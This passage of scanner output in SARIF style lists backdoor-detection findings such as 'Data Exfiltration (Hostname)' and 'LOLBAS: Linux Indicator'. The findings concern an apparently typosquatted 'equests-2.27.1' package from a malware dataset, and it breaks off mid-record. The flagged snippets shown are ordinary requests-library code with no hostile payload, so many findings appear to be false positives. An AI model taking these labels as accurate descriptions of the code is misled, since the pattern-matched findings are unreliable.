                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/utils.py"
                },
                "region": {
                  "startLine": 787,
                  "startColumn": 17,
                  "endLine": 787,
                  "endColumn": 25,
                  "snippet": {
                    "text": "                    return True\n\n    with set_environ('no_proxy', no_proxy_arg):\n        # parsed.hostname can be `None` in cases such as a file URI.\n        try:\n            bypass = proxy_bypass(parsed.hostname)\n        except (TypeError, socket.gaierror):\n",
                    "rendered": {
                      "text": "                    return True\n\n    with set_environ('no_proxy', no_proxy_arg):\n        # parsed.hostname can be `None` in cases such as a file URI.\n        try:\n            bypass = proxy_bypass(parsed.hostname)\n        except (TypeError, socket.gaierror):\n",
                      "markdown": "`                    return True\n\n    with set_environ('no_proxy', no_proxy_arg):\n        # parsed.hostname can be `None` in cases such as a file URI.\n        try:\n            bypass = proxy_bypass(parsed.hostname)\n        except (TypeError, socket.gaierror):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/utils.py"
                },
                "region": {
                  "startLine": 781,
                  "startColumn": 26,
                  "endLine": 781,
                  "endColumn": 34,
                  "snippet": {
                    "text": "                host_with_port += ':{}'.format(parsed.port)\n\n            for host in no_proxy:\n                if parsed.hostname.endswith(host) or host_with_port.endswith(host):\n                    # The URL does match something in no_proxy, so we don't want\n                    # to apply the proxies on this URL.\n                    return True\n",
                    "rendered": {
                      "text": "                host_with_port += ':{}'.format(parsed.port)\n\n            for host in no_proxy:\n                if parsed.hostname.endswith(host) or host_with_port.endswith(host):\n                    # The URL does match something in no_proxy, so we don't want\n                    # to apply the proxies on this URL.\n                    return True\n",
                      "markdown": "`                host_with_port += ':{}'.format(parsed.port)\n\n            for host in no_proxy:\n                if parsed.hostname.endswith(host) or host_with_port.endswith(host):\n                    # The URL does match something in no_proxy, so we don't want\n                    # to apply the proxies on this URL.\n                    return True\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/utils.py"
                },
                "region": {
                  "startLine": 776,
                  "startColumn": 36,
                  "endLine": 776,
                  "endColumn": 44,
                  "snippet": {
                    "text": "                    # matches the IP of the index\n                    return True\n        else:\n            host_with_port = parsed.hostname\n            if parsed.port:\n                host_with_port += ':{}'.format(parsed.port)\n\n",
                    "rendered": {
                      "text": "                    # matches the IP of the index\n                    return True\n        else:\n            host_with_port = parsed.hostname\n            if parsed.port:\n                host_with_port += ':{}'.format(parsed.port)\n\n",
                      "markdown": "`                    # matches the IP of the index\n                    return True\n        else:\n            host_with_port = parsed.hostname\n            if parsed.port:\n                host_with_port += ':{}'.format(parsed.port)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/utils.py"
                },
                "region": {
                  "startLine": 771,
                  "startColumn": 28,
                  "endLine": 771,
                  "endColumn": 36,
                  "snippet": {
                    "text": "                if is_valid_cidr(proxy_ip):\n                    if address_in_network(parsed.hostname, proxy_ip):\n                        return True\n                elif parsed.hostname == proxy_ip:\n                    # If no_proxy ip was defined in plain IP notation instead of cidr notation &\n                    # matches the IP of the index\n                    return True\n",
                    "rendered": {
                      "text": "                if is_valid_cidr(proxy_ip):\n                    if address_in_network(parsed.hostname, proxy_ip):\n                        return True\n                elif parsed.hostname == proxy_ip:\n                    # If no_proxy ip was defined in plain IP notation instead of cidr notation &\n                    # matches the IP of the index\n                    return True\n",
                      "markdown": "`                if is_valid_cidr(proxy_ip):\n                    if address_in_network(parsed.hostname, proxy_ip):\n                        return True\n                elif parsed.hostname == proxy_ip:\n                    # If no_proxy ip was defined in plain IP notation instead of cidr notation &\n                    # matches the IP of the index\n                    return True\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/utils.py"
                },
                "region": {
                  "startLine": 769,
                  "startColumn": 49,
                  "endLine": 769,
                  "endColumn": 57,
                  "snippet": {
                    "text": "        if is_ipv4_address(parsed.hostname):\n            for proxy_ip in no_proxy:\n                if is_valid_cidr(proxy_ip):\n                    if address_in_network(parsed.hostname, proxy_ip):\n                        return True\n                elif parsed.hostname == proxy_ip:\n                    # If no_proxy ip was defined in plain IP notation instead of cidr notation &\n",
                    "rendered": {
                      "text": "        if is_ipv4_address(parsed.hostname):\n            for proxy_ip in no_proxy:\n                if is_valid_cidr(proxy_ip):\n                    if address_in_network(parsed.hostname, proxy_ip):\n                        return True\n                elif parsed.hostname == proxy_ip:\n                    # If no_proxy ip was defined in plain IP notation instead of cidr notation &\n",
                      "markdown": "`        if is_ipv4_address(parsed.hostname):\n            for proxy_ip in no_proxy:\n                if is_valid_cidr(proxy_ip):\n                    if address_in_network(parsed.hostname, proxy_ip):\n                        return True\n                elif parsed.hostname == proxy_ip:\n                    # If no_proxy ip was defined in plain IP notation instead of cidr notation &\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/utils.py"
                },
                "region": {
                  "startLine": 766,
                  "startColumn": 34,
                  "endLine": 766,
                  "endColumn": 42,
                  "snippet": {
                    "text": "            host for host in no_proxy.replace(' ', '').split(',') if host\n        )\n\n        if is_ipv4_address(parsed.hostname):\n            for proxy_ip in no_proxy:\n                if is_valid_cidr(proxy_ip):\n                    if address_in_network(parsed.hostname, proxy_ip):\n",
                    "rendered": {
                      "text": "            host for host in no_proxy.replace(' ', '').split(',') if host\n        )\n\n        if is_ipv4_address(parsed.hostname):\n            for proxy_ip in no_proxy:\n                if is_valid_cidr(proxy_ip):\n                    if address_in_network(parsed.hostname, proxy_ip):\n",
                      "markdown": "`            host for host in no_proxy.replace(' ', '').split(',') if host\n        )\n\n        if is_ipv4_address(parsed.hostname):\n            for proxy_ip in no_proxy:\n                if is_valid_cidr(proxy_ip):\n                    if address_in_network(parsed.hostname, proxy_ip):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/utils.py"
                },
                "region": {
                  "startLine": 761,
                  "startColumn": 25,
                  "endLine": 761,
                  "endColumn": 33,
                  "snippet": {
                    "text": "\n    if no_proxy:\n        # We need to check whether we match here. We need to see if we match\n        # the end of the hostname, both with and without the port.\n        no_proxy = (\n            host for host in no_proxy.replace(' ', '').split(',') if host\n        )\n",
                    "rendered": {
                      "text": "\n    if no_proxy:\n        # We need to check whether we match here. We need to see if we match\n        # the end of the hostname, both with and without the port.\n        no_proxy = (\n            host for host in no_proxy.replace(' ', '').split(',') if host\n        )\n",
                      "markdown": "`\n    if no_proxy:\n        # We need to check whether we match here. We need to see if we match\n        # the end of the hostname, both with and without the port.\n        no_proxy = (\n            host for host in no_proxy.replace(' ', '').split(',') if host\n        )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/utils.py"
                },
                "region": {
                  "startLine": 755,
                  "startColumn": 14,
                  "endLine": 755,
                  "endColumn": 22,
                  "snippet": {
                    "text": "        no_proxy = get_proxy('no_proxy')\n    parsed = urlparse(url)\n\n    if parsed.hostname is None:\n        # URLs don't always have hostnames, e.g. file:/// urls.\n        return True\n\n",
                    "rendered": {
                      "text": "        no_proxy = get_proxy('no_proxy')\n    parsed = urlparse(url)\n\n    if parsed.hostname is None:\n        # URLs don't always have hostnames, e.g. file:/// urls.\n        return True\n\n",
                      "markdown": "`        no_proxy = get_proxy('no_proxy')\n    parsed = urlparse(url)\n\n    if parsed.hostname is None:\n        # URLs don't always have hostnames, e.g. file:/// urls.\n        return True\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/utils.py"
                },
                "region": {
                  "startLine": 773,
                  "startColumn": 33,
                  "endLine": 773,
                  "endColumn": 37,
                  "snippet": {
                    "text": "                        return True\n                elif parsed.hostname == proxy_ip:\n                    # If no_proxy ip was defined in plain IP notation instead of cidr notation &\n                    # matches the IP of the index\n                    return True\n        else:\n            host_with_port = parsed.hostname\n",
                    "rendered": {
                      "text": "                        return True\n                elif parsed.hostname == proxy_ip:\n                    # If no_proxy ip was defined in plain IP notation instead of cidr notation &\n                    # matches the IP of the index\n                    return True\n        else:\n            host_with_port = parsed.hostname\n",
                      "markdown": "`                        return True\n                elif parsed.hostname == proxy_ip:\n                    # If no_proxy ip was defined in plain IP notation instead of cidr notation &\n                    # matches the IP of the index\n                    return True\n        else:\n            host_with_port = parsed.hostname\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/utils.py"
                },
                "region": {
                  "startLine": 772,
                  "startColumn": 57,
                  "endLine": 772,
                  "endColumn": 61,
                  "snippet": {
                    "text": "                    if address_in_network(parsed.hostname, proxy_ip):\n                        return True\n                elif parsed.hostname == proxy_ip:\n                    # If no_proxy ip was defined in plain IP notation instead of cidr notation &\n                    # matches the IP of the index\n                    return True\n        else:\n",
                    "rendered": {
                      "text": "                    if address_in_network(parsed.hostname, proxy_ip):\n                        return True\n                elif parsed.hostname == proxy_ip:\n                    # If no_proxy ip was defined in plain IP notation instead of cidr notation &\n                    # matches the IP of the index\n                    return True\n        else:\n",
                      "markdown": "`                    if address_in_network(parsed.hostname, proxy_ip):\n                        return True\n                elif parsed.hostname == proxy_ip:\n                    # If no_proxy ip was defined in plain IP notation instead of cidr notation &\n                    # matches the IP of the index\n                    return True\n        else:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/utils.py"
                },
                "region": {
                  "startLine": 772,
                  "startColumn": 33,
                  "endLine": 772,
                  "endColumn": 37,
                  "snippet": {
                    "text": "                    if address_in_network(parsed.hostname, proxy_ip):\n                        return True\n                elif parsed.hostname == proxy_ip:\n                    # If no_proxy ip was defined in plain IP notation instead of cidr notation &\n                    # matches the IP of the index\n                    return True\n        else:\n",
                    "rendered": {
                      "text": "                    if address_in_network(parsed.hostname, proxy_ip):\n                        return True\n                elif parsed.hostname == proxy_ip:\n                    # If no_proxy ip was defined in plain IP notation instead of cidr notation &\n                    # matches the IP of the index\n                    return True\n        else:\n",
                      "markdown": "`                    if address_in_network(parsed.hostname, proxy_ip):\n                        return True\n                elif parsed.hostname == proxy_ip:\n                    # If no_proxy ip was defined in plain IP notation instead of cidr notation &\n                    # matches the IP of the index\n                    return True\n        else:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/utils.py"
                },
                "region": {
                  "startLine": 659,
                  "startColumn": 29,
                  "endLine": 659,
                  "endColumn": 33,
                  "snippet": {
                    "text": "    \"\"\"This function allows you to check if an IP belongs to a network subnet\n\n    Example: returns True if ip = 192.168.1.1 and net = 192.168.1.0/24\n             returns False if ip = 192.168.1.1 and net = 192.168.100.0/24\n\n    :rtype: bool\n    \"\"\"\n",
                    "rendered": {
                      "text": "    \"\"\"This function allows you to check if an IP belongs to a network subnet\n\n    Example: returns True if ip = 192.168.1.1 and net = 192.168.1.0/24\n             returns False if ip = 192.168.1.1 and net = 192.168.100.0/24\n\n    :rtype: bool\n    \"\"\"\n",
                      "markdown": "`    \"\"\"This function allows you to check if an IP belongs to a network subnet\n\n    Example: returns True if ip = 192.168.1.1 and net = 192.168.1.0/24\n             returns False if ip = 192.168.1.1 and net = 192.168.100.0/24\n\n    :rtype: bool\n    \"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/utils.py"
                },
                "region": {
                  "startLine": 658,
                  "startColumn": 28,
                  "endLine": 658,
                  "endColumn": 32,
                  "snippet": {
                    "text": "def address_in_network(ip, net):\n    \"\"\"This function allows you to check if an IP belongs to a network subnet\n\n    Example: returns True if ip = 192.168.1.1 and net = 192.168.1.0/24\n             returns False if ip = 192.168.1.1 and net = 192.168.100.0/24\n\n    :rtype: bool\n",
                    "rendered": {
                      "text": "def address_in_network(ip, net):\n    \"\"\"This function allows you to check if an IP belongs to a network subnet\n\n    Example: returns True if ip = 192.168.1.1 and net = 192.168.1.0/24\n             returns False if ip = 192.168.1.1 and net = 192.168.100.0/24\n\n    :rtype: bool\n",
                      "markdown": "`def address_in_network(ip, net):\n    \"\"\"This function allows you to check if an IP belongs to a network subnet\n\n    Example: returns True if ip = 192.168.1.1 and net = 192.168.1.0/24\n             returns False if ip = 192.168.1.1 and net = 192.168.100.0/24\n\n    :rtype: bool\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/utils.py"
                },
                "region": {
                  "startLine": 656,
                  "startColumn": 46,
                  "endLine": 656,
                  "endColumn": 50,
                  "snippet": {
                    "text": "\n\ndef address_in_network(ip, net):\n    \"\"\"This function allows you to check if an IP belongs to a network subnet\n\n    Example: returns True if ip = 192.168.1.1 and net = 192.168.1.0/24\n             returns False if ip = 192.168.1.1 and net = 192.168.100.0/24\n",
                    "rendered": {
                      "text": "\n\ndef address_in_network(ip, net):\n    \"\"\"This function allows you to check if an IP belongs to a network subnet\n\n    Example: returns True if ip = 192.168.1.1 and net = 192.168.1.0/24\n             returns False if ip = 192.168.1.1 and net = 192.168.100.0/24\n",
                      "markdown": "`\n\ndef address_in_network(ip, net):\n    \"\"\"This function allows you to check if an IP belongs to a network subnet\n\n    Example: returns True if ip = 192.168.1.1 and net = 192.168.1.0/24\n             returns False if ip = 192.168.1.1 and net = 192.168.100.0/24\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/utils.py"
                },
                "region": {
                  "startLine": 253,
                  "startColumn": 5,
                  "endLine": 253,
                  "endColumn": 11,
                  "snippet": {
                    "text": "        # this is already a valid path, no need to do anything further\n        return path\n\n    # find the first valid part of the provided path and treat that as a zip archive\n    # assume the rest of the path is the name of a member in the archive\n    archive, member = os.path.split(path)\n    while archive and not os.path.exists(archive):\n",
                    "rendered": {
                      "text": "        # this is already a valid path, no need to do anything further\n        return path\n\n    # find the first valid part of the provided path and treat that as a zip archive\n    # assume the rest of the path is the name of a member in the archive\n    archive, member = os.path.split(path)\n    while archive and not os.path.exists(archive):\n",
                      "markdown": "`        # this is already a valid path, no need to do anything further\n        return path\n\n    # find the first valid part of the provided path and treat that as a zip archive\n    # assume the rest of the path is the name of a member in the archive\n    archive, member = os.path.split(path)\n    while archive and not os.path.exists(archive):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/structures.py"
                },
                "region": {
                  "startLine": 105,
                  "startColumn": 28,
                  "endLine": 105,
                  "endColumn": 33,
                  "snippet": {
                    "text": "        return self.__dict__.get(key, None)\n\n    def get(self, key, default=None):\n        return self.__dict__.get(key, default)\n",
                    "rendered": {
                      "text": "        return self.__dict__.get(key, None)\n\n    def get(self, key, default=None):\n        return self.__dict__.get(key, default)\n",
                      "markdown": "`        return self.__dict__.get(key, None)\n\n    def get(self, key, default=None):\n        return self.__dict__.get(key, default)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/structures.py"
                },
                "region": {
                  "startLine": 102,
                  "startColumn": 28,
                  "endLine": 102,
                  "endColumn": 33,
                  "snippet": {
                    "text": "    def __getitem__(self, key):\n        # We allow fall-through here, so values default to None\n\n        return self.__dict__.get(key, None)\n\n    def get(self, key, default=None):\n        return self.__dict__.get(key, default)\n",
                    "rendered": {
                      "text": "    def __getitem__(self, key):\n        # We allow fall-through here, so values default to None\n\n        return self.__dict__.get(key, None)\n\n    def get(self, key, default=None):\n        return self.__dict__.get(key, default)\n",
                      "markdown": "`    def __getitem__(self, key):\n        # We allow fall-through here, so values default to None\n\n        return self.__dict__.get(key, None)\n\n    def get(self, key, default=None):\n        return self.__dict__.get(key, default)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/hooks.py"
                },
                "region": {
                  "startLine": 26,
                  "startColumn": 17,
                  "endLine": 26,
                  "endColumn": 22,
                  "snippet": {
                    "text": "def dispatch_hook(key, hooks, hook_data, **kwargs):\n    \"\"\"Dispatches a hook dictionary on a given piece of data.\"\"\"\n    hooks = hooks or {}\n    hooks = hooks.get(key)\n    if hooks:\n        if hasattr(hooks, '__call__'):\n            hooks = [hooks]\n",
                    "rendered": {
                      "text": "def dispatch_hook(key, hooks, hook_data, **kwargs):\n    \"\"\"Dispatches a hook dictionary on a given piece of data.\"\"\"\n    hooks = hooks or {}\n    hooks = hooks.get(key)\n    if hooks:\n        if hasattr(hooks, '__call__'):\n            hooks = [hooks]\n",
                      "markdown": "`def dispatch_hook(key, hooks, hook_data, **kwargs):\n    \"\"\"Dispatches a hook dictionary on a given piece of data.\"\"\"\n    hooks = hooks or {}\n    hooks = hooks.get(key)\n    if hooks:\n        if hasattr(hooks, '__call__'):\n            hooks = [hooks]\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/help.py"
                },
                "region": {
                  "startLine": 31,
                  "startColumn": 10,
                  "endLine": 32,
                  "snippet": {
                    "text": "    OpenSSL = None\n    cryptography = None\nelse:\n    import OpenSSL\n    import cryptography\n\n\ndef _implementation():\n",
                    "rendered": {
                      "text": "    OpenSSL = None\n    cryptography = None\nelse:\n    import OpenSSL\n    import cryptography\n\n\ndef _implementation():\n",
                      "markdown": "`    OpenSSL = None\n    cryptography = None\nelse:\n    import OpenSSL\n    import cryptography\n\n\ndef _implementation():\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/help.py"
                },
                "region": {
                  "startLine": 28,
                  "startColumn": 3,
                  "endLine": 28,
                  "endColumn": 12,
                  "snippet": {
                    "text": "    from urllib3.contrib import pyopenssl\nexcept ImportError:\n    pyopenssl = None\n    OpenSSL = None\n    cryptography = None\nelse:\n    import OpenSSL\n",
                    "rendered": {
                      "text": "    from urllib3.contrib import pyopenssl\nexcept ImportError:\n    pyopenssl = None\n    OpenSSL = None\n    cryptography = None\nelse:\n    import OpenSSL\n",
                      "markdown": "`    from urllib3.contrib import pyopenssl\nexcept ImportError:\n    pyopenssl = None\n    OpenSSL = None\n    cryptography = None\nelse:\n    import OpenSSL\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/compat.py"
                },
                "region": {
                  "startLine": 64,
                  "startColumn": 87,
                  "endLine": 64,
                  "endColumn": 103,
                  "snippet": {
                    "text": "\nelif is_py3:\n    from urllib.parse import urlparse, urlunparse, urljoin, urlsplit, urlencode, quote, unquote, quote_plus, unquote_plus, urldefrag\n    from urllib.request import parse_http_list, getproxies, proxy_bypass, proxy_bypass_environment, getproxies_environment\n    from http import cookiejar as cookielib\n    from http.cookies import Morsel\n    from io import StringIO\n",
                    "rendered": {
                      "text": "\nelif is_py3:\n    from urllib.parse import urlparse, urlunparse, urljoin, urlsplit, urlencode, quote, unquote, quote_plus, unquote_plus, urldefrag\n    from urllib.request import parse_http_list, getproxies, proxy_bypass, proxy_bypass_environment, getproxies_environment\n    from http import cookiejar as cookielib\n    from http.cookies import Morsel\n    from io import StringIO\n",
                      "markdown": "`\nelif is_py3:\n    from urllib.parse import urlparse, urlunparse, urljoin, urlsplit, urlencode, quote, unquote, quote_plus, unquote_plus, urldefrag\n    from urllib.request import parse_http_list, getproxies, proxy_bypass, proxy_bypass_environment, getproxies_environment\n    from http import cookiejar as cookielib\n    from http.cookies import Morsel\n    from io import StringIO\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/compat.py"
                },
                "region": {
                  "startLine": 45,
                  "startColumn": 35,
                  "endLine": 45,
                  "endColumn": 51,
                  "snippet": {
                    "text": "if is_py2:\n    from urllib import (\n        quote, unquote, quote_plus, unquote_plus, urlencode, getproxies,\n        proxy_bypass, proxy_bypass_environment, getproxies_environment)\n    from urlparse import urlparse, urlunparse, urljoin, urlsplit, urldefrag\n    from urllib2 import parse_http_list\n    import cookielib\n",
                    "rendered": {
                      "text": "if is_py2:\n    from urllib import (\n        quote, unquote, quote_plus, unquote_plus, urlencode, getproxies,\n        proxy_bypass, proxy_bypass_environment, getproxies_environment)\n    from urlparse import urlparse, urlunparse, urljoin, urlsplit, urldefrag\n    from urllib2 import parse_http_list\n    import cookielib\n",
                      "markdown": "`if is_py2:\n    from urllib import (\n        quote, unquote, quote_plus, unquote_plus, urlencode, getproxies,\n        proxy_bypass, proxy_bypass_environment, getproxies_environment)\n    from urlparse import urlparse, urlunparse, urljoin, urlsplit, urldefrag\n    from urllib2 import parse_http_list\n    import cookielib\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 1620,
                  "startColumn": 28,
                  "endLine": 1620,
                  "endColumn": 34,
                  "snippet": {
